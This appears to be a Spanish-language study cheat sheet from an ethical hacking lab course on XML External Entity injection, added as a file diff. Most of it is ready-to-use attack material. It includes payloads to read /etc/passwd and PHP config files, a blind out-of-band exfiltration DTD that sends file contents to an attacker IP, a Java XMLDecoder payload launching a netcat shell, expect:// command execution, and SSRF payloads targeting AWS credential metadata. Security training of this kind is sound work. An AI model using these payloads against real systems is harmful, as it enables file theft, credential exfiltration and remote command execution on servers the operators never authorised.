@@ -1,0 +1,340 @@
+================================================================
+  XXE - XML External Entity Injection
+  D1n0 | Ethical Hacking Lab | U-TAD 2025-2026
+================================================================
+
+----------------------------------------------------------------
+METODOLOGIA DE USO (paso a paso con BurpSuite)
+----------------------------------------------------------------
+
+1. Abre BurpSuite y activa Intercept (Proxy > Intercept > On)
+
+2. Navega a la pagina que envia XML (formulario, boton, carga
+   de archivo...) y realiza la accion para generar la peticion
+
+3. BurpSuite captura la peticion. Identificar que contiene XML:
+     - Busca Content-Type: text/xml  o  application/xml
+     - O un parametro GET tipo ?xml=<tag>valor</tag>
+
+4. Manda la peticion al Repeater (Ctrl+R) para trabajar comodo
+
+5. Localiza el XML en el cuerpo o en el parametro GET.
+   Identifica un campo cuyo valor se refleje en la respuesta.
+   Ese sera el campo donde inyectaremos &xxe;
+
+6. Modifica el XML añadiendo el DOCTYPE antes del nodo raiz:
+
+   ANTES:
+     <?xml version="1.0"?>
+     <test>hacker</test>
+
+   DESPUES:
+     <?xml version="1.0"?>
+     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+     <test>&xxe;</test>
+
+7. Si el XML va en un parametro GET, encoda el payload:
+     Ctrl+U en BurpSuite para URL-encodear la seleccion
+     O usa el encoder de BurpSuite (Decoder tab)
+
+8. Pulsa Send y observa la respuesta:
+     - Si aparece el contenido de /etc/passwd --> VULNERABLE
+     - Si la respuesta esta vacia o da error --> prueba otro campo
+       o cambia el archivo objetivo
+
+9. Segun lo que encuentres, escala el ataque:
+     - Leer .php sin ejecutar  --> usa php://filter + base64
+     - Sin reflejo en respuesta --> monta Blind XXE con exfil.dtd
+     - Servidor Java           --> prueba XXE + XMLDecoder
+     - Acceso a red interna    --> usa http:// para SSRF
+
+10. Documenta los archivos leidos y los vectores encontrados
+
+----------------------------------------------------------------
+DECISION RAPIDA: que tecnica usar
+----------------------------------------------------------------
+
+  Tengo reflejo en la respuesta?
+    SI --> XXE basico con file:// o php://filter
+    NO --> Blind XXE con DTD externo
+
+  El archivo que quiero leer es .php?
+    SI --> php://filter/read=convert.base64-encode/resource=...
+    NO --> file:///ruta/al/archivo
+
+  Quiero acceder a servicios internos?
+    --> SYSTEM "http://IP_interna:puerto/"
+
+  El servidor corre Java?
+    --> Prueba XXE via XMLDecoder para RCE
+
+----------------------------------------------------------------
+1. INTRODUCCION
+----------------------------------------------------------------
+
+XML (eXtensible Markup Language) es uno de los formatos mas
+habituales para almacenar informacion. Muchos tipos de archivos
+lo usan internamente: PDF, RSS, SVG, SOAP...
+
+----------------------------------------------------------------
+DOCUMENT TYPE DEFINITION (DTD)
+----------------------------------------------------------------
+
+Permite definir la estructura y bloques de los que estara
+formado el archivo XML. Puede importarse externa o internamente.
+
+Ejemplo de DTD externo (message.dtd):
+  <!ELEMENT message (from,to,body)>
+  <!ELEMENT from (#PCDATA)>
+  <!ELEMENT to (#PCDATA)>
+  <!ELEMENT body (#PCDATA)>
+  <!ATTLIST body time CDATA "">
+
+XML que lo importa:
+  <?xml version="1.0"?>
+  <!DOCTYPE message SYSTEM "message.dtd">
+  <message>
+    <from>Mario</from>
+    <to>Luigi</to>
+    <body time="16.38">Wanna play? - Cheers, SuperMario!</body>
+  </message>
+
+----------------------------------------------------------------
+ENTITIES BLOCK (Entidades)
+----------------------------------------------------------------
+
+Las entidades son como variables dentro de XML. Tipos:
+  - Internas: valor fijo declarado en el propio DTD
+  - Externas: apuntan a un recurso externo con SYSTEM
+
+Entidad interna:
+  <!ENTITY sign "- Cheers, SuperMario!">
+  Uso: &sign;  -->  se sustituye por el valor
+
+Entidad externa (SYSTEM):
+  <!ENTITY name SYSTEM "URI">
+  --> El parser va a buscar el recurso en la URI indicada
+
+----------------------------------------------------------------
+2. XXE INJECTION
+----------------------------------------------------------------
+
+Es uno de los tipos de inyeccion XML mas peligrosos. Permite
+inyectar entidades externas en la definicion del documento para
+leer archivos internos del servidor.
+
+Peticion inicial (normal):
+  ../example1.php?xml=<test>hacker</test>
+
+Peticion modificada (inyeccion de entidad con valor fijo):
+  ../example1.php?xml=<!DOCTYPE foo [<!ENTITY xmli "testing">]><test>&xmli;</test>
+
+  IMPORTANTE: encodear los caracteres con URL Encode al inyectar
+  en parametros GET. En BurpSuite Repeater se puede enviar sin
+  encodear si se modifica directamente el cuerpo.
+
+Inyeccion con SYSTEM para leer archivos (XXE real):
+  ../example1.php?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>
+
+  El parser resuelve &xxe; --> lee /etc/passwd --> lo devuelve
+  en la respuesta dentro de <test>.
+
+No se limita al protocolo file://, tambien funciona con:
+  file://  -->  archivos locales del sistema
+  http://  -->  peticiones HTTP (SSRF)
+  ftp://   -->  servicios FTP
+  dns://   -->  resolucion DNS (util en blind)
+
+Archivos utiles a leer:
+  file:///etc/passwd
+  file:///etc/hosts
+  file:///etc/hostname
+  file:///proc/self/environ
+  file:///var/www/html/config.php   (ojo: PHP se ejecuta, ver base64)
+  file:///C:/Windows/win.ini        (Windows)
+
+----------------------------------------------------------------
+PHP + BASE64 (leer archivos .php sin ejecutarlos)
+----------------------------------------------------------------
+
+Problema: pedir un .php con file:// hace que el servidor lo
+ejecute, no que devuelva el codigo fuente. Respuesta vacia.
+
+Solucion: php://filter para leer el archivo codificado en base64
+antes de que PHP lo interprete.
+
+  <!ENTITY xxe SYSTEM
+  "php://filter/read=convert.base64-encode/resource=file:///path/to/config.php">
+
+Peticion completa:
+  ../example1.php?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM
+  "php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">]>
+  <test>&xxe;</test>
+
+La respuesta devuelve el contenido del archivo en base64.
+Decodificar en Kali:
+  echo "<cadena_base64>" | base64 -d
+
+----------------------------------------------------------------
+FLUJO EN BURPSUITE (XXE en GET/POST)
+----------------------------------------------------------------
+
+  1. Intercepta la peticion que envia XML
+  2. Manda al Repeater (Ctrl+R)
+  3. Añade el DOCTYPE justo despues de <?xml version="1.0"?>
+  4. Referencia &xxe; en un campo que se refleje en la respuesta
+  5. Send --> observa si la respuesta contiene el archivo
+
+  Si el XML va en GET (parametro ?xml=...):
+    Encoda el payload con URL Encode antes de enviarlo:
+    %3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+...
+
+  Si el XML va en el body de un POST:
+    Se puede pegar directamente en el Repeater sin encodear.
+
+----------------------------------------------------------------
+3. BLIND XXE INJECTION
+----------------------------------------------------------------
+
+Similar a Blind SQL Injection: el servidor parsea el XML pero
+no devuelve el contenido en la respuesta. Hay que exfiltrar
+los datos hacia un sistema controlado por el atacante.
+
+Requisito: el servidor debe tener visibilidad/acceso hacia
+la IP del atacante (misma red, VPN, internet...).
+
+Verificacion basica (comprobar si hay peticion saliente):
+  ../example1.php?xml=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+  "http://192.168.0.177/"> %xxe;]><test>hola</test>
+
+  Si el servidor es vulnerable hara una peticion GET a tu IP.
+  Capturas con: python3 -m http.server 80
+
+Exfiltracion completa con DTD externo (exfil.dtd):
+
+  Paso 1: crea el archivo exfil.dtd en tu servidor (Kali):
+
+    <!ENTITY % file SYSTEM "file:///etc/hostname">
+    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM
+    'http://[IP_ATACANTE]/?x=%file;'>">
+    %eval;
+    %exfil;
+
+  Paso 2: sirve el archivo:
+    python3 -m http.server 80
+
+  Paso 3: peticion al servidor vulnerable:
+    ../example1.php?xml=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+    "http://[IP_ATACANTE]/exfil.dtd"> %xxe;]><test>hola</test>
+
+  El servidor carga exfil.dtd --> lee /etc/hostname --> hace una
+  peticion GET a tu IP con el contenido como parametro.
+  Lo ves en los logs del servidor HTTP.
+
+  NOTA: &#x25; es el caracter % en hex (necesario para anidar
+  entidades parametro dentro de otra entidad parametro).
+
+----------------------------------------------------------------
+4. XXE TO RCE (ejecucion de comandos)
+----------------------------------------------------------------
+
+Es posible ejecutar comandos si el servidor tiene habilitado
+el modulo 'expect' de PHP (raro en produccion, posible en labs).
+
+  ../example1.php?xml=<!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "expect://id" >
+  ]><test>&xxe;</test>
+
+  Si expect esta habilitado, la respuesta incluye la salida de
+  id: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+RCE via Java XMLDecoder (si el servidor usa Java en el backend):
+
+  Metodo Runtime.exec():
+    <?xml version="1.0" encoding="UTF-8"?>
+    <java version="1.7.0_21" class="java.beans.XMLDecoder">
+      <object class="java.lang.Runtime" method="getRuntime">
+        <void method="exec">
+          <array class="java.lang.String" length="6">
+            <void index="0"><string>/usr/bin/nc</string></void>
+            <void index="1"><string>-l</string></void>
+            <void index="2"><string>-p</string></void>
+            <void index="3"><string>9999</string></void>
+            <void index="4"><string>-e</string></void>
+            <void index="5"><string>/bin/sh</string></void>
+          </array>
+        </void>
+      </object>
+    </java>
+
+  Metodo ProcessBuilder (alternativa):
+    Misma estructura pero con class="java.lang.ProcessBuilder"
+    y void method="start" al final del bloque.
+
+----------------------------------------------------------------
+5. XXE + SSRF
+----------------------------------------------------------------
+
+SSRF (Server-Side Request Forgery): la aplicacion hace peticiones
+a sistemas internos a peticion del atacante, mostrando total o
+parcialmente el contenido del recurso.
+
+XXE permite SSRF porque SYSTEM acepta URIs HTTP, forzando al
+servidor a hacer peticiones hacia su propia red interna.
+
+Ejemplo de explotacion (XXE + SSRF):
+  <!DOCTYPE root [
+    <!ENTITY test SYSTEM 'http://maquina_interna/recurso.txt'>
+  ]><root>&test;</root>
+
+  El servidor hace la peticion HTTP interna y devuelve el
+  contenido del recurso en la respuesta.
+
+Payloads SSRF utiles (evasion de filtros de localhost):
+  http://[::]:80/               IPv6 loopback puerto 80
+  http://[::]:25/               SMTP
+  http://[::]:22/               SSH
+  http://[::]:3128/             Squid proxy
+  http://2130706433/            = http://127.0.0.1 (decimal)
+  http://3232235521/            = http://192.168.0.1 (decimal)
+
+Casos de uso de XXE+SSRF:
+  - Mapear servicios internos (puertos abiertos en red interna)
+  - Acceder a paneles de administracion internos
+  - Leer metadatos de cloud (AWS: 169.254.169.254)
+  - Pivotar hacia redes no accesibles directamente
+
+Ejemplo con AWS metadata:
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+
+----------------------------------------------------------------
+RESUMEN DE ATAQUES
+----------------------------------------------------------------
+
+  Tipo              Tecnica                          Resultado
+  ----------------------------------------------------------------
+  XXE basico        SYSTEM file://                   Lectura archivos
+  XXE + PHP         php://filter/base64-encode       Lectura .php
+  Blind XXE         DTD externo + http://            Exfiltracion OOB
+  XXE to RCE        expect:// o Java XMLDecoder      Ejecucion comandos
+  XXE + SSRF        SYSTEM http://interna            Acceso red interna
+
+----------------------------------------------------------------
+RECURSOS
+----------------------------------------------------------------
+
+  PayloadsAllTheThings XXE:
+    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
+
+  PayloadsAllTheThings SSRF:
+    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
+
+  Lista de payloads XXE (hackplayers):
+    https://www.hackplayers.com/2019/12/lista-de-payloads-para-inyecciones-xxe.html
+
+  Retos PortSwigger:
+    https://portswigger.net/web-security/xxe
+    https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
+
+================================================================
